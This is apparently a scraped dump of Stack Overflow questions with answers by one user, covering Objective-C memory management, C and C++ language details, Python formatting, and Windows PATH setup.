        // do i have to init currentObject.name (NSString) here? i guess not?
        [self setParseChars:YES]; // just set the flag to make parse control easier
    }
    else if ([elementName isEqualToString:@""number""]) {
        // int isn't object anyway, no init
        [self setParseChars:YES]; // just set the flag to make parse control easier
    }   
}

- parser foundCharacters (...) {
    if (parseChars) {
        currentChars = [[NSString alloc] initWithString:string];
        // why is currentChars retainCount = 2 here?
        // is it like currentChars = [NSString new] and then currentChars = string? (so retain once more)
        // is it good way to control parser? (please ignore the NSMutableString and appending example, try this one)
        // should I just do currentChars = string here?

        [currentChars autorelease]; // this is currently my solution, because there's no leak, but i feel it's incorrect?
    }
}

-  parser didEndElement (...) {
    if ([elementName isEqualToString:@""object""]) {
        [objectArray addObject:[currentObject copy]]; // should I copy here or just addObject, it retains anyway?
        [currentObject release]; // I've initialized currentObject before, now I don't need it, so i guess retainCount goes to 0 here?
    }
    else if ([elementName isEqualToString:@""name""]) {
        currentObject.name = currentChars; // is this correct, or shoud I do [currentChars copy] as well?
        [self setParseChars:NO];
        [currentChars release]; // as before, initialized, now releasing, but is this really correct?
    }
    else if ([elementName isEqualToString:@""number""]) {
        currentObject.number = [currentChars intValue]; // is this correct, or shoud I do [currentChars copy] as well?
        [self setParseChars:NO];
        [currentChars release]; // as before, initialized, now releasing, but is this really correct?
    }   
}

- (void) dealloc {
    // i shouldn't release currentChars or currentObject, those (i suppose) should be freed after parsing done,
    // as a result of earlier releases?

    [objectArray release];
    [super dealloc];
}
</code></pre>

<p>Model.m</p>

<pre><code>@implementation Model

@synthesize name; // this is NSString
@synthesize number; // this is int

- (id) copyWithZone:(NSZone *) zone {
    Model *copy = [[[self class] allocWithZone:zone] init];
    copy.name = [self.name copy];
    copy.number = self.number;
    return copy;
}

- (void) dealloc {
    [name release];
    // i dont have to release int, right? it's not an object
    [super dealloc];
}
</code></pre>

<p>I'm especially confused with question 4. Sorry for maybe too long question, but this really is about one topic and deeper understanding of it.</p>
","9530","Adam Rosenfield","<h1>1st question - iterations and temporary assigments</h1>

<p>You should NOT be releasing the objects here since you are not an owner.  You should only ever release an object if you are an owner of it.  See the <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/MemoryMgmt.html"" rel=""nofollow"">Memory Management Guide for Cocoa</a>.  You are only an owner of an object if you call a method whose name begins with <code>init</code>, <code>new</code>, or contains <code>copy</code> in its name.</p>

<p>Since the for loop does not use methods with any of those names, you are not an owner, so you MUST NOT release the objects.  This will result in freeing objects before they're done, which will almost certainly result in memory corruption and a crash.</p>

<h1>2nd question - instant retains:</h1>

<p>You don't need to <em>instantly</em> call retain, you just need to call it before the autorelease pool next empties.  This will probably be shortly after your method returns to the main event loop.  Since you don't know exactly when this will happen, you have to make sure that if you want to be able to access the object after the function (<code>loadXMLButtonClicked:</code> in this case) returns, then you must <code>retain</code> it before you return.</p>

<p>Since <code>decodeObjectForKey</code> does not begin with <code>init</code> or <code>new</code> or contain <code>copy</code> in its name, you are not becoming an owner.  Calling <code>retain</code> makes you an owner.</p>

<h1>3rd question - autoreleasing and passing variables:</h1>

<p>First of all, it's bad practice to shadow a class member with a local variable of the same name.  Secondly, unless <code>loadData</code> is being used as a multi-purpose utility function (which I'm guessing it isn't since it doesn't take any parameters), it should just assign the result directly to the member variable <code>objectArray</code>.  It's pointless and error-prone to return the result and then have the calling function assign to the member variable.</p>

<p>Thirdly, you're not using the <code>objectArray</code> property setter -- you're just assigning straight to the member variable.  If you want to use the setter, you have to explicitly say <code>self.objectArray = ...</code> (with the <code>self.</code> in front of it).  Thus, <code>objectArray</code> is never retained, so it's going to be deallocated the next time the autorelease pool clears itself out, which is not what you want.  You must retain it at some point, or conversely, just don't autorelease it at the end of <code>loadData</code>, and assign it the class member variable <code>objectArray</code>.</p>

<p>If the property is declared with the <code>retain</code> attribute, then using the setter will automatically call <code>retain</code> when you assign with it (and it will also <code>release</code> the old value).  If instead the property is declared with the <code>copy</code> attribute, then the value will instead be copied every time you assign to it, and you will become an owner of the new object.</p>

<h1>4th question - parser xml best practice:</h1>

<p>You're making a shallow copy of the object array.  If you want to make a deep copy, you can use the <a href=""http://developer.apple.com/DOCUMENTATION/Cocoa/Reference/Foundation/Classes/NSArray_Class/Reference/Reference.html#//apple_ref/occ/instm/NSArray/initWithArray:copyItems:"" rel=""nofollow""><code>initWithArray:copyItems:</code></a> message.</p>

<blockquote>
  <p>do i have to init currentObject.name (NSString) here? i guess not?</p>
</blockquote>

<p>I don't understand this question, there's no <code>currentObject.name</code> mentioned at all anywhere nearby that code.</p>

<blockquote>
  <p>why is currentChars retainCount = 2 here?</p>
</blockquote>

<p>Probably because during its internal initialization process, it was <code>retain</code>ed an extra time somewhere, but it was also almost certainly <code>autoreleased</code> an extra time as well.  If you follow all of the rules from the Memory Management Guide for Cocoa, you won't have any problems.  You should never rely on retain counts, since you don't know how many times an object has been autoreleased.  They're a debugging aid, not something that should be used for program control flow.</p>

<blockquote>
  <p>this is currently my solution, because there's no leak, but i feel it's incorrect?</p>
</blockquote>

<p>If you won't need to use <code>currentChars</code> the next time you return to the event loop, then it's fine.  If you will need to use it, you should not release or autorelease it here, and then release it when you're sure you're done with it.</p>

<blockquote>
  <p>should I copy here or just addObject, it retains anyway?</p>
</blockquote>

<p>Just <code>addObject</code>: when you add items into an <code>NSArray</code>, <code>NSSet</code>, or <code>NSDictionary</code>, they are automatically <code>retain</code>ed by the data structure.  When you remove them, they're <code>release</code>d.</p>

<p>Most of the rest of the questions can be answered by just following the rules or have identical answers to some of the previous questions which I've already answered.</p>
"
"<p>I really don't know how to say, may be this is why I didn't found a solution on Google.
My problem is simple.
I want to run program from the execute command just by putting their names and not the path.
For example type 'myprog' to open 'c:/program/myprog.exe'
That's all!
Thanks for your help :)</p>
","9530","Adam Rosenfield","<ol>
<li>Right-click <strong>My Computer</strong></li>
<li>Select <strong>Properties</strong></li>
<li>Click the <strong>Advanced</strong> tab</li>
<li>Click <strong>Environment Variables</strong></li>
<li>Select <strong>Path</strong> from the <em>System variables</em> pane and click <strong>Edit</strong></li>
<li>Append the text <strong>"";C:\path\to\folder\containing\your\program""</strong> (with the semicolon)</li>
</ol>
"
"<p>I've just read this <a href=""http://www.vandevoorde.com/C++Solutions/"">nice piece</a> from reddit.<br />
They mention ""<code>and</code>"" and ""<code>or</code>"" being ""Alternative Tokens"" to <code>&amp;&amp;</code> and <code>||</code><br />
I was really unaware of these just till now.   Of course, everybody knows about the <a href=""http://en.wikipedia.org/wiki/C_trigraph"">di-graphs and tri-graphs</a> but ""<code>and</code>"" and ""<code>or</code>""? Seriously? Since when? Is this a recent addition to the standard?</p>

<p>I've just checked it with Visual C++ 2008 and it doesn't seem to recognize these as anything other than a syntax error. What's going on?</p>
","9530","Adam Rosenfield","<p>See the C++ standard.  The committee draft #2 is freely available at <a href=""ftp://ftp.research.att.com/dist/c++std/WP/CD2/body.pdf"" rel=""nofollow"">ftp://ftp.research.att.com/dist/c++std/WP/CD2/body.pdf</a>, although it's non-authoritative, out-of-date, and partially incorrect in a few places.  Specifically, in section 2.5, <strong>Alternative Tokens</strong>, the following are defined:</p>

<pre>
Alternative Primary
&lt;%          {
%&gt;          }
&lt;:          [
:&gt;          ]
%:          #
%:%:        ##
and         &&
bitor       |
or          ||
xor         ^
compl       ~
bitand      &
and_eq      &=
or_eq       |=
xor_eq      ^=
not         !
not_eq      !=
</pre>

<p>Though honestly, I've never seen any of them ever used except for <code>and</code>, <code>or</code>, and <code>not</code>, and even then, those are rare.  Note that these are NOT allowable by default in plain C code, only in C++.  If you want to use them in C, you'll have to either <code>#define</code> them yourself as macros, or <code>#include</code> the header <code>&lt;iso646.h&gt;</code>, which defines all of the above except for <code>&lt;%</code> <code>&gt;%</code> <code>&lt;:</code> <code>:&gt;</code> <code>%:</code> <code>%:%:</code> as macros (see section 7.9 of the C99 standard).</p>
"
"<p>I've been Googling around with no luck.  I'm looking for a way to do getc() or gets() or whatever that does not echo to the terminal.  I saw kbhit() but this doesn't appear to be part of ANSI.  Ideally, I'd like code that looks like</p>

<pre><code>char s[100];
no_echo_gets(s); /* Won't echo to screen while being typed */
printf(""%s\n"", s);
</code></pre>

<p>Does anybody know a good ANSI compliant way to do this?</p>
","9530","Adam Rosenfield","<p>You can't do it in a cross-platform manner using ANSI C.  You'll have to use some OS-specific code, or use a library such as <a href=""http://www.gnu.org/software/ncurses/"" rel=""nofollow"">ncurses</a>.</p>
"
"<p><a href=""http://stackoverflow.com/questions/69738/c-how-to-get-fprintf-results-as-a-stdstring-w-o-sprintf#69911"">A previous question</a> showed a nice way of printing to a string. The answer involved va_copy:</p>

<pre><code>std::string format (const char *fmt, ...);
{
   va_list ap;
   va_start (ap, fmt);
   std::string buf = vformat (fmt, ap);
   va_end (ap);
   return buf;
}


std::string vformat (const char *fmt, va_list ap)
{
   // Allocate a buffer on the stack that's big enough for us almost
   // all the time.
   s ize_t size = 1024;
   char buf[size];

   // Try to vsnprintf into our buffer.
   va_list apcopy;
   va_copy (apcopy, ap);
   int needed = vsnprintf (&amp;buf[0], size, fmt, ap);

   if (needed &lt;= size) {
       // It fit fine the first time, we're done.
       return std::string (&amp;buf[0]);
   } else {
       // vsnprintf reported that it wanted to write more characters
       // than we allotted.  So do a malloc of the right size and try again.
       // This doesn't happen very often if we chose our initial size
       // well.
       std::vector &lt;char&gt; buf;
       size = needed;
       buf.resize (size);
       needed = vsnprintf (&amp;buf[0], size, fmt, apcopy);
       return std::string (&amp;buf[0]);
   }
</code></pre>

<p>}</p>

<p>The problem I'm having is that the above code doesn't port to Visual C++ because it doesn't provide va_copy (or even __va_copy). So, does anyone know how to safely port the above code? Presumably, I need to do a va_copy copy because vsnprintf destructively modifies the passed va_list.</p>
","9530","Adam Rosenfield","<p>You should be able to get away with just doing a regular assignment:</p>

<pre><code>va_list apcopy = ap;
</code></pre>

<p>It's technically non-portable and undefined behavior, but it will work with most compilers and architectures.  In the x86 calling convention, <code>va_list</code>s are just pointers into the stack and are safe to copy.</p>
"
"<p>How do I make nested loops in Python (version 3.0)?</p>

<p>I am trying to get the following loops to show me the products of two numbers:</p>

<pre><code>def PrintProductsBelowNumber(number):
    number1 = 1
    number2 = 1
    while number1 &lt;= number:
        while number2 &lt;= number:
            print(number1, ""*"", number2, ""="", number1 * number2)
            number2 += 1
        number1 += 1

PrintProductsBelowNumber(2)
</code></pre>

<p>As a result I get:</p>

<pre><code>1 * 1 = 1
1 * 2 = 2
</code></pre>

<p>So it seems the outer loop over number1 does not run.</p>

<p>How do I get the loop over number1 to run, and thus obtain:</p>

<pre><code>1 * 1 = 1
1 * 2 = 2
2 * 1 = 2
2 * 2 = 4
</code></pre>
","9530","Adam Rosenfield","<p><code>number2</code> only gets initialized once, you need to re-initialize it for each iteration of the inner loop.  However, this code is very C-like and not very Pythonic.  The better way to do it would be to use the <code>for number in range(n)</code> construct:</p>

<pre><code>def PrintProductsBelowNumber(number):
    for number1 in range(1, number+1):
        for number2 in range(1, number+1):
            print(number1, ""*"", number2, ""="", number1 * number2)
</code></pre>
"
"<p>Let's say I have a function that accepts a <code>void (*)(void*)</code> function pointer for use as a callback:</p>

<pre><code>void do_stuff(void (*callback_fp)(void*), void* callback_arg);
</code></pre>

<p>Now, if I have a function like this:</p>

<pre><code>void my_callback_function(struct my_struct* arg);
</code></pre>

<p>Can I do this safely?</p>

<pre><code>do_stuff((void (*)(void*)) &amp;my_callback_function, NULL);
</code></pre>

<p>I've looked at <a href=""http://stackoverflow.com/questions/188839/function-pointer-cast-to-different-signature"">this question</a> and I've looked at some C standards which say you can cast to 'compatible function pointers', but I cannot find a definition of what 'compatible function pointer' means.</p>
","9530","Adam Rosenfield","<p>As far as the C standard is concerned, if you cast a function pointer to a function pointer of a different type and then call that, it is <em>undefined behavior</em>.  See Annex J.2:</p>

<blockquote>
  <p>The behavior is undefined in the following circumstances:</p>
  
  <ul>
  <li>A pointer is used to call a function whose type is not compatible with the pointed-to 
  type (6.3.2.3). </li>
  </ul>
</blockquote>

<p>Section 6.3.2.3, paragraph 8 reads:</p>

<blockquote>
  <p>A pointer to a function of one type may be converted to a pointer to a function of another 
  type and back again; the result shall compare equal to the original pointer. If a converted 
  pointer is used to call a function whose type is not compatible with the pointed-to type, 
  the behavior is undefined.</p>
</blockquote>

<p>So in other words, you can cast a function pointer to a different function pointer type, cast it back again, and call it, and things will work.</p>

<p>The definition of <em>compatible</em> is somewhat complicated.  It can be found in section 6.7.5.3, paragraph 15:</p>

<blockquote>
  <p>For two function types to be compatible, both shall specify compatible return types<sup>127</sup>.</p>
  
  <p>Moreover, the parameter type lists, if both are present, shall agree in the number of 
  parameters and in use of the ellipsis terminator; corresponding parameters shall have 
  compatible types. If one type has a parameter type list and the other type is specified by a 
  function declarator that is not part of a function definition and that contains an empty 
  identifier list, the parameter list shall not have an ellipsis terminator and the type of each 
  parameter shall be compatible with the type that results from the application of the 
  default argument promotions. If one type has a parameter type list and the other type is 
  specified by a function definition that contains a (possibly empty) identifier list, both shall 
  agree in the number of parameters, and the type of each prototype parameter shall be 
  compatible with the type that results from the application of the default argument 
  promotions to the type of the corresponding identifier. (In the determination of type 
  compatibility and of a composite type, each parameter declared with function or array 
  type is taken as having the adjusted type and each parameter declared with qualified type 
  is taken as having the unqualified version of its declared type.) </p>
  
  <p>127) If both function types are ‘‘old style’’, parameter types are not compared.</p>
</blockquote>

<p>The rules for determining whether two types are compatible are described in section 6.2.7, and I won't quote them here since they're rather lengthy, but you can read them on the <a href=""http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1256.pdf"">draft of the C99 standard (PDF)</a>.</p>

<p>The relevant rule here is in section 6.7.5.1, paragraph 2:</p>

<blockquote>
  <p>For two pointer types to be compatible, both shall be identically qualified and both shall be pointers to compatible types.</p>
</blockquote>

<p>Hence, since a <code>void*</code> is not compatible with a <code>struct my_struct*</code>, a function pointer of type <code>void (*)(void*)</code> is not compatible with a function pointer of type <code>void (*)(struct my_struct*)</code>, so this casting of function pointers is technically undefined behavior.</p>

<p>In practice, though, you can safely get away with casting function pointers in some cases.  In the x86 calling convention, arguments are pushed on the stack, and all pointers are the same size (4 bytes in x86 or 8 bytes in x86_64).  Calling a function pointer boils down to pushing the arguments on the stack and doing an indirect jump to the function pointer target, and there's obviously no notion of types at the machine code level.</p>

<p>Things you definitely <strong>can't</strong> do:</p>

<ul>
<li>Cast between function pointers of different calling conventions.  You will mess up the stack and at best, crash, at worst, succeed silently with a huge gaping security hole.  In Windows programming, you often pass function pointers around.  Win32 expects all callback functions to use the <code>stdcall</code> calling convention (which the macros <code>CALLBACK</code>, <code>PASCAL</code>, and <code>WINAPI</code> all expand to).  If you pass a function pointer that uses the standard C calling convention (<code>cdecl</code>), badness will result.</li>
<li>In C++, cast between class member function pointers and regular function pointers.  This often trips up C++ newbies.  Class member functions have a hidden <code>this</code> parameter, and if you cast a member function to a regular function, there's no <code>this</code> object to use, and again, much badness will result.</li>
</ul>

<p>Another bad idea that might sometimes work but is also undefined behavior:</p>

<ul>
<li>Casting between function pointers and regular pointers (e.g. casting a <code>void (*)(void)</code> to a <code>void*</code>).  Function pointers aren't necessarily the same size as regular pointers, since on some architectures they might contain extra contextual information.  This will probably work ok on x86, but remember that it's undefined behavior.</li>
</ul>
"
"<p>I'm pretty old school sometimes and I like working with Emacs in my terminal. (I work with IDEs all the time. But sometimes, when in the privacy of my own home, I just like a text editor a terminal and a beer)</p>

<p>However, the default  Emacs that comes with OS X does not seem to highlight the comments in font-lock-mode. I've seen this behavior in both Python and C mode.</p>

<p>I've already searched some forums and I found one post where the person was having the same problem as me:</p>

<p><a href=""http://forums.macosxhints.com/showthread.php?p=512361"" rel=""nofollow"">http://forums.macosxhints.com/showthread.php?p=512361</a></p>

<p>Is is there any way to fix this problem?</p>
","9530","Adam Rosenfield","<p>I had this exact same problem.  The solution is to change the color used for the comment face as follows:</p>

<pre><code>(set-face-foreground 'font-lock-comment-face ""red"")
</code></pre>

<p>Or, if you only want to do this for certain modes:</p>

<pre><code>;;; Only do this for the common C mode (C, C++, Objective-C)
(add-hook 'c-mode-common-hook #'(lambda () (set-face-foreground 'font-lock-comment-face ""red"")))
</code></pre>

<p>For more information on faces, see <a href=""http://www.gnu.org/software/emacs/manual/html%5Fnode/emacs/Faces.html"" rel=""nofollow"">http://www.gnu.org/software/emacs/manual/html_node/emacs/Faces.html</a>.</p>
"
"<p>Heres my code. </p>

<pre><code>import os, sys
if len(sys.argv) != 2:
     sys.exit(1)

h = os.popen(""wget -r %s"") % sys.argv[1]
fil = open(""links.txt"",""w"")
dir = os.listdir(""%s"") % sys.argv[1]

for file in dir:
     print file.replace(""@"",""?"")
     fil.write(""%s/""+file.replace(""@"",""?"")) % sys.argv[1]
     fil.write(""\n"")
h.close()
</code></pre>

<p>running the it, like this python project.py <a href=""http://google.com"" rel=""nofollow"">http://google.com</a></p>

<p>gives me error code. </p>

<pre><code>1.py:5 RuntimeWarning: tp_compare didnt return -1 or -2 for exception
h = os.popen(""wget -r %s"") % sys.argv[1]
Traceback (most recent call last):
File ""1.py"" line 5, in &lt;module&gt;
h = os.popen(""wget -r %s"") % sys.argv[1]
TypeError: unsupported operand type&lt;s&gt; for %: 'file' and 'str'
</code></pre>

<p>What are im going wrong. (Still learning python) Any solution/ tip?</p>

<p>I dont explain the code, i think you understand what im trying to do</p>
","9530","Adam Rosenfield","<p>You're putting the <code>%</code> operator in the wrong place: you need to put it directly after the format string:</p>

<pre><code>h = os.popen(""wget -r %s"" % sys.argv[1])
...
dir = os.listdir(""%s"" % sys.argv[1])
...
fil.write((""%s/""+file.replace(""@"",""?"")) % sys.argv[1])
</code></pre>

<p>Alternatively, since you're just using <code>%s</code>, just do plain and simple string concatenation:</p>

<pre><code>h = os.popen(""wget -r "" + sys.argv[1])
...
dir = os.listdir(sys.argv[1])
...
fil.write(sys.argv[1] + ""/"" + file.replace(""@"",""?""))
</code></pre>
"
"<p>I have a hypothetical UIViewController class named ""foo"". foo inherits from class bar and class bar #import's ""Class A"", a class which foo uses extensively. The problem is, when I'm using an instance of class A in foo, I don't get any compiler errors, but I do get a warning for instance, that an instance of Class A does not respond to a particular method. Do I have to explicitly #import ClassA.h into class 'foo'? even though class foo extends extends bar, which alread imports it?</p>

<p>Hope that's not too confusing. Let me know if I need to clear anything up.</p>
","9530","Adam Rosenfield","<p>It sounds like you have a circular dependency issue.  In order to resolve it, yes, each imlementation file (<code>.m</code>) needs to <code>#import</code> the proper header file.  However, if you try to have the <em>header</em> files <code>#import</code> each other, you'll run into problems.</p>

<p>In order to use inheritance, you need to know the size of the superclass, which means you need to <code>#import</code> it.  For other things, though, such as member variables which are pointers, or methods which take as a parameter or return the other type, you don't actually need the class definition, so you can use a <strong>forward reference</strong> to resolve the compiler errors.</p>

<pre><code>// bar.h
@class A;  // forward declaration of class A -- do not to #import it here

@interface bar : UIViewController
{
    A *member;  // ok
}

- (A) method:(A)parameter;  // also ok
@end

// bar.m
#import ""bar.h""
#import ""A.h""

// can now use bar &amp; A without any errors or warnings
</code></pre>
"
"<p>I have a token class that looks something like this:</p>

<pre><code>class Token
{
 public:
   typedef enum { STRTOK, INTTOK } Type;
   virtual bool IsA(Type) = 0;
}

class IntTok : public Token
{
   int data;
 public:
   bool IsA(Type t) { return (t == INTTOK); }
   int GetData() { return data; }
}

IntTok newToken;
if ( newToken.IsA(Token::INTTOK )
{
  //blah blah
}
</code></pre>

<p>So essentially I have to have every subclass defined in the Token class; which doesn't turn out that bad because there are very few subclasses and I can't imagine them changing. But still, it's ugly, kludgy and less ""correct"" than identifying subclasses using a dynamic cast. However:</p>

<pre><code>IntTok newToken;
IntTok* tmpTokenTest = dynamic_cast&lt;IntTok*&gt;(&amp;newToken);
if ( tmpTokenTest != NULL )
{
  //blah blah
}
</code></pre>

<p>Is also pretty kludgy. Particularly when I have to string them together in a large, nested if. </p>

<p>So which would you use? Is there another solution to this problem?</p>

<p><em>Note:</em> I know that I'll have to cast them to get at their respective data anyways, but </p>

<ol>
<li>I won't be casting them until right before I use their function, so it feels cleaner and</li>
<li>I test their type far more often then I use their data.</li>
</ol>

<p><em>Note2:</em> Not indicated in the code above is that these tokens are also a linked list. That makes templating difficult(a <code>Token&lt;int&gt;</code> may point to a <code>Token&lt;string&gt;</code>, etc). Which is why I need a Token class as a parent to begin with.</p>
","9530","Adam Rosenfield","<p>Just use virtual functions instead to do what you want.  Instead of this:</p>

<pre><code>if(newToken.IsA(Token::INTTOK))
{
    // do stuff with ((IntTok*)&amp;newToken)-&gt;GetData()
}
</code></pre>

<p>Do this:</p>

<pre><code>class Token
{
public:
    ...
    virtual void doTypeDependentStuff() {}  // empty default implementation
}

class IntTok : public Token
{
public:
    ...
    void doTypeDependent()
    {
        // do stuff with data
    }
}
</code></pre>
"
"<p>I have a custom class that has quite a few accessor methods for customizing it. My question is, if a programmer uses this class and doesn't bother to assign values for ALL of these methods because he doesn't know about them or doesn't want to bother, how can I make the class assume a default view? I can't use awakeFromNib, because that would override purposeful customization in, say, an AppController awakeFromNib.</p>

<p>Any simple way to do this?</p>

<p>EDIT:</p>

<p>The class in an NSView, and the customization methods just modify an instance variable then tell the view to redraw (background color, etc.). When I don't explicitly tell the object somewhere to assign values for ALL of these customizations, it sets them to zero. I need to change this to where they assume usable default values. </p>
","9530","Adam Rosenfield","<p>I'm confused about what you're trying to do.  If you want to set default values for class members, just assign to them in your <code>init</code> method(s):</p>

<pre><code>- (id) init
{
    if((self = [super init]))
    {
        member1 = member1default;
        member2 = member2default;  // etc.
    }
    return self;
}

- (id) initWithCoder:(NSCoder *)encoder  // this is called for objects constructed from a NIB
{
    if((self = [super initWithCoder:encoder]))
    {
        member1 = member1default;
        member2 = member2default;  // etc.
    }
    return self;
}
</code></pre>
"
"<p>There is another thread to discuss Fibo series in Python. This is to tweak code into more pythonic. <a href=""http://stackoverflow.com/questions/494594/how-to-write-the-fibonacci-sequence-in-python"">How to write the Fibonacci Sequence in Python</a></p>

<p>I am in love with this program I wrote to solve Project Euler Q2. I am newly coding in Python and rejoice each time I do it The Pythonic way! Can you suggest a better Pythonic way to do this?</p>

<p><a href=""http://projecteuler.net/index.php?section=problems&amp;id=2"">Project Euler Q2</a>. Find the sum of all the even-valued terms in the Fibonacci sequence which do not exceed four million.</p>

<pre><code>fib=[]
def fibo(a=-1,b=1,upto=4000000):
    if a+b&gt;=upto:
        return
    else:
        a,b=b,a+b
        fib.append(b)
        fibo(a,b)

fibo()
even=[i for i in fib if not i%2]
print sum(even)
</code></pre>
","9530","Adam Rosenfield","<p>I would make the following changes:</p>

<ul>
<li>Use iteration instead of recursion</li>
<li>Just keep a running total instead of keeping a list of all Fibonacci numbers and then finding the sum of the even ones a posterior</li>
</ul>

<p>Other than that, it's <em>reasonably</em> Pythonic.</p>

<pre><code>def even_fib_sum(limit):
    a,b,sum = 0,1,0
    while a &lt;= limit:
        if a%2 == 0:
            sum += a
        a,b = b,a+b
    return sum

print(even_fib_sum(4000000))
</code></pre>
"
"<p>What is an easy way in Python to format integers into strings representing thousands with K, and millions with M, and leaving just couple digits after comma?</p>

<p>I'd like to show 7436313 as 7.44M, and 2345 as 2,34K.</p>

<p>Is there some % string formatting operator available for that? Or that could be done only by actually dividing by 1000 in a loop and constructing result string step by step?</p>
","9530","Adam Rosenfield","<p>I don't think there's a built-in function that does that.  You'll have to roll your own, e.g.:</p>

<pre><code>def human_format(num):
    magnitude = 0
    while abs(num) &gt;= 1000:
        magnitude += 1
        num /= 1000.0
    # add more suffixes if you need them
    return '%.2f%s' % (num, ['', 'K', 'M', 'G', 'T', 'P'][magnitude])

print('the answer is %s' % human_format(7436313))  # prints 'the answer is 7.44M'
</code></pre>
"
"<p>I was reading about bitmap images.  They are one of the more simple image formats (especially 1 bit bitmaps).  I am interested to see what a sound file looks like.  May someone refer me to the most simple sound file format?</p>

<p>thanks  </p>

<p>Actually, I found this <a href=""http://technology.niagarac.on.ca/courses/ctec1631/WavFileFormat.html"" rel=""nofollow"">wav file link</a>.  If someone else has any other links/words of wisdom they'd like to post I'd appreciate it.</p>
","9530","Adam Rosenfield","<p>Wave files are the simplest sound format.  They have a header (which can sometimes be complicated but usually isn't), and then the actual sound data is raw, uncompressed PCM.  Because they're uncompressed, though, they get very big very fast for even moderately long sounds.</p>
"
"<p>I'm currently trying to use a certain SDK that has me loading functions off a DLL that a vendor provides.. I have to pass arguments to these functions and the DLL does all the work..</p>

<p>Now, the DLL is supposed to be communicating with another device, while I just wait for the results.  However, I don't have this device, so how do I set up a mock interface to emulate the device?</p>

<p>To be clear, here's an example:</p>

<pre><code>myfuncpointer.Open(someparam,anotherparam,...);
</code></pre>

<p>Now, because I don't have the device, the DLL can't actually perform the above function; it fails.  How do I set up testing so that the DLL talks to a class that I designed rather than the device? Is there any way to redirect the DLL's call? </p>

<p>How do I make  a DummyDevice class to do this?</p>

<p>Thanks.. </p>

<p>P.S. If anything is not clear, please don't be too quick to downvote.. Comment as to what I need to explain and I'll try to clear it up.. Thanks.</p>

<p><hr /></p>

<p>EDIT: What I DO have, however, is a spec sheet with all of the data structures used and the expected/legal values that it has to contain.  So for example, if I call a function:</p>

<pre><code>myfuncpointer.getinfo(param,otherparam);
</code></pre>

<p>where one of the params is a data structure that the DLL fills up with info (say, if an option is enabled) after querying the device.. I can do this</p>

<pre><code>param.option = true;
</code></pre>

<p>after it has finished the getinfo call.</p>

<p>Is this a good way to test the code? It seems very very dangerous to trick this DLL into thinking all the wrong things and seems to be really really hard to scale even just a bit..</p>
","9530","Adam Rosenfield","<p>It depends on how the DLL accesses the device.  If it does so by calling functions in another DLL, you can supply a mock DLL where you've replaced the appropriate functions.  However, if the DLL is doing something low-level, such as calling directly into the kernel, you're going to have a much tougher time.  In that case, you'll probably have to write a new device driver or kernel extension or something.</p>
"
"<p>I am going to start learning Abstract Algebra- Groups, Rings,etc. I am interested to know any programming language, if at all which can help me learn/try the concepts I learn in theory. </p>

<p>EDIT: I am not really looking at <strong>implementing</strong> what I learn. I am interested to know any language which already supports them.</p>

<p>Thank You.</p>
","9530","Adam Rosenfield","<p><a href=""http://www.wolfram.com/products/mathematica/index.html"" rel=""nofollow"">Mathematica</a> has a lot of useful functions for dealing with concepts in abstract algebra.  Unfortunately, it's proprietary software and very expensive.  <a href=""http://www.sagemath.org/"" rel=""nofollow"">Sage</a> is a free alternative, which also has a pretty good repertoire of abstract algebra functions, although I haven't used it as extensively so I can't comment much more on it.</p>
"
"<p>My logging code uses the return value of <a href=""http://linux.die.net/man/3/backtrace"" rel=""nofollow"">backtrace()</a> to determine the current stack depth (for pretty printing purposes), but I can see from profiling that this is a pretty expensive call.</p>

<p>I don't suppose there's a cheaper way of doing this?  Note that I don't care about the frame addresses, just how many of them there are.</p>

<p>edit: These logging functions are used all over a large code-base, so manually tracking the stack depth isn't really an option.</p>
","9530","Adam Rosenfield","<p>Walking the stack yourself is pretty quick - most of the slowness in <code>backtrace()</code> is from looking up symbol names.  On x86, you can do the following:</p>

<pre><code>inline uint32_t get_ebp(void)
{
    __asm__ __volatile__(""mov %%ebp, %%eax"");
}

int get_stack_depth(void)
{
    uint32_t ebp = get_ebp();
    int stack_depth = 0;
    while(ebp != 0)
    {
        ebp = *(uint32_t *)ebp;
        stack_depth++;
    }
    return stack_depth;
}
</code></pre>

<p>This will walk the chain of <code>ebp</code> pointers.  Keep in mind that this is extremely non-portable.  Also note that this will not count any functions which have been inlined or tail-call optimized (of course, <code>backtrace()</code> has the same problem).</p>

<p>Another important issue is the termination condition -- once you backtrace up to <code>main()</code>, there often aren't guarantees about what you'll find in the stack.  So, if libc doesn't put a null frame pointer, you'll very likely segfault.  You can get the termination value by looking at it at the very beginning of <code>main()</code>.</p>
"
"<p>I have a single buffer, and several pointers into it.  I want to sort the pointers based upon the bytes in the buffer they point at.</p>

<p>qsort() and stl::sort() can be given custom comparision functions.  For example, if the buffer was zero-terminated I could use strcmp:</p>

<pre><code>int my_strcmp(const void* a,const void* b) {
  const char* const one = *(const char**)a,
  const two = *(const char**)b;
  return ::strcmp(one,two);
}
</code></pre>

<p>however, if the buffer is not zero-terminated, I have to use memcmp() which requires a length parameter.</p>

<p>Is there a tidy, efficient way to get the length of the buffer into my comparision function without a global variable?</p>
","9530","Adam Rosenfield","<p>With the C function <code>qsort()</code>, no, there is no way to pass the length to your comparison function without using a global variable, which means it can't be done in a thread-safe manner.  Some systems have a <a href=""http://www.ipnom.com/FreeBSD-Man-Pages/qsort_r.3.html"" rel=""nofollow""><code>qsort_r()</code></a> function (<em>r</em> stands for reentrant) which allows you to pass an extra <em>context</em> parameter, which then gets passed on to your comparison function:</p>

<pre><code>int my_comparison_func(void *context, const void *a, const void *b)
{
    return memcmp(*(const void **)a, *(const void **)b, (size_t)context);
}

qsort_r(data, n, sizeof(void*), (void*)number_of_bytes_to_compare, &amp;my_comparison_func);
</code></pre>
"
"<p>I had an article, but I lost it.  It showed and described a couple of C/C++ tricks that people should be careful. One of them interested me but now that I am trying to replicate it I'm not being able to put it to compile.</p>

<p>The concept was that it is possible to change by accident the value of a <code>const</code> in C/C++</p>

<p>It was something like this:</p>

<pre><code>const int a = 3;          // I promise I won't change a
const int *ptr_to_a = &amp;a; // I still promise I won't change a
int *ptr;
ptr = ptr_to_a;

(*ptr) = 5;               // I'm a liar; a is now 5
</code></pre>

<p>I wanted to show this to a friend but now I'm missing a step.  Does anyone know what's missing for it to start compiling and working?</p>

<p>ATM I'm getting <strong>invalid conversion from 'const int*' to 'int*'</strong> but when I read the article I tried and it worked great.</p>
